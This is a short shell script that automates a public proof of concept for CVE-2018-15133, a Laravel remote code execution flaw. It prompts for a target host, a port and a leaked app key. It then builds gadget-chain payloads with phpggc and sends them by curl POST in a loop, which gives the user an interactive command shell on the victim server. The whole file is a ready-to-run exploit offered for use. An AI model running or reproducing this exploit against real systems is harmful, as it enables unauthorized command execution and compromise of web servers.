#!/bin/sh
echo '**************************************************************************************'
echo '********                         Better PoC                            ***************'
echo '********                             for                               ***************'
echo '********                        CVE 2018 15133                         ***************'
echo '**************************************************************************************'
chmod +x cve-2018-15133.php
# all credits goes to kozmic for developing the poc, this is just an automation of that poc
read -p "Enter Uri of the vulnerable web app:- " host
read -p "Enter port of the vulnerable web app:- " port
read -p "Enter base64 encoded app key:- " APP_KEY
com="whoami"
while [ "$com" != "exit" ]
do
	if ! [ -x "$(command -v phpggc)" ]
then
	echo "You must have phpggc installed, please install it via sudo apt install phpggc"
	exit
fi
obj=$(phpggc Laravel/RCE1 system "$com" -b 2>/dev/null)
token=$(./cve-2018-15133.php $APP_KEY $obj | tail -n 1)
curl $host:$port -X POST -H "$token" 2>/dev/null| cut -d "<" -f 1 -z 
read -p "SHELL>" com
done
